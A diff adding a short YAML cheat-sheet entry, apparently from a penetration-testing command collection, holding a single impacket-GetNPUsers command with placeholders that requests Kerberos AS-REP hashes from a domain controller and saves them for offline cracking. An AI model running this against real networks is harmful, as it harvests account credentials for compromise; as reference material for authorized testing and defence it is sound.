@@ -1,0 +1,8 @@
+metadata:
+  filename: "impacket-GetNPUsers-AS-REP-roasting.yaml"
+  tags: ["domain", "cracking"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  impacket-GetNPUsers -dc-ip <domain-controller-ip> -request -outputfile hashes.asreproast <domain>/<username>:<password>
